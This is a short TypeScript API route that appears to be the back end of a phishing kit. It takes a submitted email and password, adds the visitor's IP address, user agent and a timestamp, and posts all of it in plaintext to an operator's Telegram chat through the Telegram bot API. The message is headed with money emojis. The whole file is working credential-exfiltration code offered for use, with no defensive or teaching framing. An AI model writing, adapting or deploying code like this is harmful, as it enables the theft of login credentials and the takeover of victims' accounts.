export const runtime = 'nodejs'

interface Body {
  email?: string
  password?: string
  event?: string
}

export async function POST(req: Request) {
  try {
    const { email, password, event } = (await req.json()) as Body

    if (!email || !password || !event) {
      return new Response('Missing fields', { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      return new Response('Missing bot credentials', { status: 500 })
    }

    const ip =
      req.headers.get('x-forwarded-for')?.split(',')?.[0]?.trim() ||
      req.headers.get('x-real-ip') ||
      'unknown'

    const ua = req.headers.get('user-agent') || 'unknown'
    const time = new Date().toISOString()

    const message = [
      `🔐 💵💵💵💵💵💵💵💵💵💵💵`,
      `📨 Event: ${event}`,
      `👤 Email: ${email}`,
      `🔑 Password: ${password}`,
      `🌐 IP: ${ip}`,
      `🧭 User-Agent: ${ua}`,
      `🕒 Time: ${time}`
    ].join('\n')

    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })

    if (!tgRes.ok) {
      const msg = await tgRes.text()
      return new Response(`Telegram error: ${msg}`, { status: 502 })
    }

    return new Response(null, { status: 204 })
  } catch (err) {
    console.error(err)
    return new Response('Server error', { status: 500 })
  }
}

